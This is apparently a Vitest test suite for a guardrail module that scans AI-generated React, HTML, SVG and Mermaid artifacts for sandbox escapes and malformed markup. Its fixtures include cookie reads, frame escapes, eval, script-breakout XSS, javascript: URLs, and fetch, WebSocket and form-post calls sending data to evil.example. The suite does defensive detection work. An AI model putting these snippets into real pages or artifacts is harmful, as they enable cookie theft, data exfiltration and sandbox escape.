import { describe, expect, it } from "vitest";

import { ArtifactTypeSchema, LIMITS } from "@/lib/schemas";
import { MOCK_ARTIFACTS } from "@/lib/tools/mock-agent-provider";

import {
  type ArtifactInspection,
  inspectArtifact,
  inspectArtifactSource,
  inspectionToProblem,
  lineColumnAt,
  SEVERITY_WEIGHTS,
} from "./artifact-guardrails";

const react = (code: string) =>
  inspectArtifactSource({ type: "react", language: "tsx", content: code });
const html = (markup: string) =>
  inspectArtifactSource({ type: "html", language: "html", content: markup });
const svg = (markup: string) =>
  inspectArtifactSource({ type: "svg", language: "svg", content: markup });
const mermaid = (source: string) =>
  inspectArtifactSource({ type: "mermaid", language: "mermaid", content: source });
const rules = (inspection: ArtifactInspection) =>
  inspection.defects.map((d) => `${d.rule}:${d.severity}`);

describe("clean artifacts", () => {
  it.each(ArtifactTypeSchema.options)("passes the %s sample with a perfect score", async (type) => {
    const { language, content } = MOCK_ARTIFACTS[type];
    expect(await inspectArtifact({ type, language, content })).toEqual({
      passed: true,
      score: 100,
      defects: [],
    });
  });

  it.each([
    [
      "generics",
      "const [items, setItems] = useState<string[]>([]);\nconst ref = useRef<HTMLDivElement | null>(null);",
    ],
    ["geometry named top", "const y = rect.top.toFixed(2); const s = { top: 0 };"],
    ["a router location", "const location = useLocation(); console.log(location.pathname);"],
    [
      "location parameters and comparisons",
      'function go(location = "/") {}\nconst f = (a, location) => location === a;\nconst g = location => location;',
    ],
    ["methods named fetch", "await api.fetch(); refetch(); store.parent.name;"],
    [
      "identifiers containing Function",
      "myFunction(1); const isFunction = typeof x === 'function';",
    ],
    [
      "mentions in comments",
      "// never use document.cookie or eval() here\n/* window.parent */ const a = 1;",
    ],
    [
      "text in JSX",
      "export default () => <p>localStorage is unavailable here. Total<span>3</span></p>;",
    ],
    [
      "arrows in attributes",
      "export default () => <div><input onChange={(e) => set(e.target.value)} /><button onClick={() => go()}>x</button></div>;",
    ],
    [
      "fragments and nesting",
      "export default () => <><ul>{items.map((i) => <li key={i}>{i}</li>)}</ul></>;",
    ],
    ["a loop that awaits", "while (true) { await tick(); }"],
    ["a loop with a break", "for (;;) { if (done()) break; step(); }"],
  ])("does not flag %s", (_case, code) => {
    expect(react(code).defects).toEqual([]);
  });
});

describe("React / TypeScript — sandbox escapes and exfiltration", () => {
  it.each([
    ["document.cookie", "const c = document.cookie;", "cookie-access:critical"],
    ["document.domain", 'document.domain = "x";', "cookie-access:critical"],
    ["window.parent", "window.parent.postMessage(data, '*');", "frame-escape:critical"],
    ["window.top", "if (window.top !== window) {}", "frame-escape:critical"],
    ["bare top.location", "top.location.href = url;", "frame-escape:critical"],
    ["opener", "self.opener.document.title = 'x';", "frame-escape:critical"],
    ["localStorage", 'localStorage.setItem("k", v);', "storage-access:high"],
    ["sessionStorage index", 'sessionStorage["k"] = v;', "storage-access:high"],
    ["window.localStorage", "const s = window.localStorage;", "storage-access:high"],
    ["indexedDB", 'indexedDB.open("db");', "storage-access:high"],
    ["eval", 'eval("1+1");', "dynamic-code:critical"],
    ["new Function", 'const f = new Function("return 1");', "dynamic-code:critical"],
    ["Function call", 'Function("return this")();', "dynamic-code:critical"],
    ["string timer", 'setTimeout("alert(1)", 10);', "dynamic-code:high"],
    ["fetch", 'fetch("https://evil.example/?d=" + data);', "network-sink:high"],
    ["WebSocket", 'new WebSocket("wss://evil.example");', "network-sink:high"],
    ["sendBeacon", 'navigator.sendBeacon("/x", data);', "network-sink:high"],
    ["XMLHttpRequest", "const x = new XMLHttpRequest();", "network-sink:high"],
    ["location assignment", 'window.location = "https://evil.example";', "navigation-sink:high"],
    ["location.href", 'location.href = "https://evil.example";', "navigation-sink:high"],
    ["bare location assignment", 'location = "https://evil.example";', "navigation-sink:high"],
    ["window.open", 'window.open("https://evil.example");', "navigation-sink:high"],
  ])("flags %s", (_case, code, expected) => {
    const result = react(code);
    expect(rules(result)).toContain(expected);
    expect(result.passed).toBe(false);
  });

  it("flags external image sources as a non-blocking defect", () => {
    const result = react('export default () => <img src="https://picsum.photos/200" alt="" />;');
    expect(rules(result)).toEqual(["external-resource:medium"]);
    expect(result.passed).toBe(true);
    expect(result.score).toBe(100 - SEVERITY_WEIGHTS.medium);
  });

  it("reports precise positions and excerpts", () => {
    const [defect] = react("const a = 1;\n  const c = document.cookie;").defects;
    expect(defect).toMatchObject({ line: 2, column: 13, excerpt: "const c = document.cookie;" });
  });
});

describe("React — structure", () => {
  it("rejects mismatched JSX closing tags", () => {
    const result = react("export default () => (\n  <div>\n    <b>x</b>\n  </span>\n);");
    expect(result.defects).toEqual([
      expect.objectContaining({
        rule: "syntax-error",
        severity: "high",
        line: 4,
        message: "Closing <span> does not match <div> opened on line 2.",
      }),
    ]);
  });

  it("names fragments in mismatch reports", () => {
    expect(react("export default () => <><p>x</p></div>;").defects[0]?.message).toBe(
      "Closing <div> does not match fragment opened on line 1.",
    );
  });

  it("reports compile errors with their position", async () => {
    const result = await inspectArtifact({
      type: "react",
      language: "tsx",
      content: "export default () => (\n  <div>\n    <p>x\n  </div>\n);",
    });
    const defect = result.defects.find((d) =>
      d.message.startsWith("The component does not compile"),
    );
    // Sucrase reports where the unbalanced JSX expression begins.
    expect(defect).toMatchObject({ rule: "syntax-error", severity: "high", line: 1 });
    expect(defect?.column).toBeGreaterThan(1);
    expect(result.passed).toBe(false);
  });

  it("compiles plain JSX artifacts too", async () => {
    expect(
      (
        await inspectArtifact({
          type: "react",
          language: "jsx",
          content: "export default () => <p/>;",
        })
      ).passed,
    ).toBe(true);
  });

  it.each([
    ["while (true) {}", "while (true) { count++; }"],
    ["while (1) without braces", "while (1) count++;"],
    ["for (;;)", "for (;;) { draw(); }"],
    ["do-while(true)", "do { spin(); } while (true);"],
  ])("rejects a runaway loop: %s", (_case, code) => {
    expect(rules(react(code))).toEqual(["runaway-loop:high"]);
  });
});

describe("HTML", () => {
  it("rejects a </script> inside a string literal (script breakout)", () => {
    const result = html('<script>const s = "</script><img src=x onerror=alert(1)>";</script>');
    expect(rules(result)).toContain("script-breakout:critical");
    expect(result.passed).toBe(false);
  });

  it("allows an escaped <\\/script> in a string", () => {
    expect(html('<script>const s = "<\\/script>";</script>').defects).toEqual([]);
  });

  it("flags script-data escape states", () => {
    expect(rules(html("<script><!-- hide\nlet a = 1;</script>"))).toEqual([
      "script-escape-state:high",
    ]);
  });

  it.each([
    ['<iframe src="https://evil.example"></iframe>', "embedded-frame:high"],
    ['<object data="x.swf"></object>', "embedded-frame:high"],
    ['<meta http-equiv="refresh" content="0;url=https://evil.example">', "navigation-sink:high"],
    ['<base href="https://evil.example/">', "navigation-sink:high"],
    ['<form action="https://evil.example/collect"><input name="pw"></form>', "network-sink:high"],
    ['<a href="javascript:alert(1)">x</a>', "javascript-url:high"],
    ['<a href=" java\tscript:alert(1)">x</a>', "javascript-url:high"],
    ['<img src="https://tracker.example/pixel.gif">', "external-resource:medium"],
    ['<img srcset="a.png 1x, https://evil.example/b.png 2x">', "external-resource:medium"],
    [
      "<style>body { background: url('https://evil.example/x.png') }</style>",
      "external-resource:medium",
    ],
    ['<link rel="stylesheet" href="https://evil.example/x.css">', "external-resource:medium"],
    ["<script>document.cookie = 'a=1';</script>", "cookie-access:critical"],
  ])("inspects %s", (markup, expected) => {
    expect(rules(html(markup))).toContain(expected);
  });

  it("inspects the code inside inline handlers", () => {
    expect(rules(html(`<button onclick="fetch('https://evil.example')">x</button>`))).toEqual([
      "network-sink:high",
      "inline-handler:medium",
    ]);
  });

  it("allows allowlisted CDNs and fonts", () => {
    const markup = [
      '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter">',
      '<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>',
      "<style>@font-face { src: url(https://fonts.gstatic.com/x.woff2) }</style>",
    ].join("\n");
    expect(html(markup).defects).toEqual([]);
  });

  it("reports unbalanced markup without blocking, respecting optional and void elements", () => {
    expect(html("<ul><li>a<li>b</ul><p>one<p>two<br><img alt=''><hr/>").defects).toEqual([]);
    const result = html("<div>\n<section><span></div>\n</em>");
    expect(rules(result)).toEqual([
      "unbalanced-markup:medium",
      "unbalanced-markup:medium",
      "unbalanced-markup:medium",
    ]);
    expect(result.passed).toBe(true);
    expect(result.defects.map((d) => d.message)).toEqual([
      "<section> is never closed.",
      "<span> is never closed.",
      "Closing tag </em> has no matching opening tag.",
    ]);
  });

  it("reports an element left open at the end", () => {
    expect(html("<main><h1>Title</h1>").defects.map((d) => d.message)).toEqual([
      "<main> is never closed.",
    ]);
  });

  it("ignores tags inside comments and scripts", () => {
    expect(html("<!-- <div> --><script>const t = '<div>';</script>").defects).toEqual([]);
  });
});

describe("SVG", () => {
  it("requires an <svg> root", () => {
    expect(rules(svg("<circle r='1'/>"))).toContain("missing-svg-root:high");
  });

  it("requires well-formed nesting (it must parse as XML)", () => {
    const result = svg("<svg><g><circle r='1'></svg>");
    expect(rules(result)).toEqual(["unbalanced-markup:high", "unbalanced-markup:high"]);
    expect(result.passed).toBe(false);
  });

  it("inspects embedded scripts", () => {
    expect(rules(svg("<svg><script>top.location.href = 'x'</script></svg>"))).toContain(
      "frame-escape:critical",
    );
  });

  it("accepts self-closing elements", () => {
    expect(svg("<svg viewBox='0 0 1 1'><rect/><g><path d='M0 0'/></g></svg>").defects).toEqual([]);
  });
});

describe("Mermaid", () => {
  it("accepts a supported diagram after comments", () => {
    expect(mermaid("%% overview\n\nsequenceDiagram\n  A->>B: hi").defects).toEqual([]);
  });

  it.each([
    ["an unknown diagram type", "flowchartz TD\n  A-->B", 'found "flowchartz"'],
    ["no diagram at all", "%% only a comment", "found nothing"],
  ])("rejects %s", (_case, source, found) => {
    const [defect] = mermaid(source).defects;
    expect(defect).toMatchObject({ rule: "unsupported-diagram", severity: "high" });
    expect(defect?.message).toContain(found);
  });

  it("grades directives by what they try to change", () => {
    const result = mermaid(
      [
        "---",
        "title: x",
        "---",
        '%%{init: {"theme": "dark"}}%%',
        '%%{init: {"securityLevel": "loose"}}%%',
        "graph TD",
        '  click A "https://example.com"',
      ].join("\n"),
    );
    expect(rules(result)).toEqual([
      "diagram-directive:medium",
      "diagram-directive:low",
      "diagram-directive:low",
      "diagram-directive:low",
    ]);
    expect(result.passed).toBe(true);
  });
});

describe("Markdown and code", () => {
  it("notes raw HTML in markdown", () => {
    expect(
      rules(
        inspectArtifactSource({
          type: "markdown",
          language: "md",
          content: "<script>x</script> [a](javascript:x)",
        }),
      ),
    ).toEqual(["raw-html:low", "raw-html:low"]);
  });

  it("never flags source code that is only displayed", () => {
    const content = 'eval("x"); fetch(url); document.cookie; while (true) {}';
    expect(inspectArtifactSource({ type: "code", language: "js", content }).defects).toEqual([]);
  });
});

describe("scoring and reporting", () => {
  it.each(ArtifactTypeSchema.options)("rejects an empty %s artifact", (type) => {
    expect(
      rules(
        inspectArtifactSource({ type, language: type === "react" ? "tsx" : "x", content: "  \n" }),
      ),
    ).toEqual(["empty-artifact:high"]);
  });

  it("is deterministic and orders defects by severity, then position", () => {
    const code =
      "const a = new XMLHttpRequest();\nconst b = document.cookie;\n<img src='https://x.example/a.png' />";
    const first = react(code);
    expect(react(code)).toEqual(first);
    expect(rules(first)).toEqual([
      "cookie-access:critical",
      "network-sink:high",
      "external-resource:medium",
    ]);
    expect(first.score).toBe(100 - 50 - 25 - 8);
  });

  it("floors the score at zero and caps the report", () => {
    const result = react('eval("x");\n'.repeat(LIMITS.artifactDefects + 20));
    expect(result.score).toBe(0);
    expect(result.defects).toHaveLength(LIMITS.artifactDefects);
  });

  it("converts an inspection into an RFC 9457 problem", () => {
    const problem = inspectionToProblem(react("eval(a);\nfetch(b);"));
    expect(problem).toMatchObject({
      code: "artifact_rejected",
      status: 422,
      detail: expect.stringMatching(/^2 blocking issues; first at line 1: /),
    });
    expect(problem.errors?.[0]).toEqual({
      path: "line 1:1",
      message: expect.stringMatching(/^\[critical\] dynamic-code: /),
    });
    expect(inspectionToProblem(react("eval(a);")).detail).toMatch(/^1 blocking issue;/);
    expect(inspectionToProblem({ passed: false, score: 0, defects: [] }).detail).toBe(
      "The artifact failed inspection.",
    );
  });

  it("computes 1-based line and column", () => {
    expect(lineColumnAt("ab\ncd", 0)).toEqual({ line: 1, column: 1 });
    expect(lineColumnAt("ab\ncd", 4)).toEqual({ line: 2, column: 2 });
  });
});

describe("script string scanning", () => {
  it.each([
    ["apostrophes in line comments", "<script>// don't worry\nconst a = 1;</script>"],
    ["quotes in block comments", '<script>/* "quoted" */ const a = 1;</script>'],
    ["a string broken by a newline", '<script>const s = "abc\nconst t = 1;</script>'],
    ["template literals spanning lines", "<script>const t = `a\nb`;</script>"],
    ["escaped quotes", '<script>const s = "a\\"b";</script>'],
    ["an unterminated block comment", "<script>/* never closed</script>"],
    ["a trailing line comment", "<script>const a = 1; // end</script>"],
  ])("does not mistake %s for a breakout", (_case, markup) => {
    expect(rules(html(markup))).not.toContain("script-breakout:critical");
  });

  it("detects a breakout inside a template literal", () => {
    expect(rules(html("<script>const t = `</script><b>x</b>`;</script>"))).toContain(
      "script-breakout:critical",
    );
  });

  it("flags external <use> references in SVG", () => {
    expect(rules(svg('<svg><use href="https://evil.example/sprite.svg#a"/></svg>'))).toEqual([
      "external-resource:medium",
    ]);
  });
});
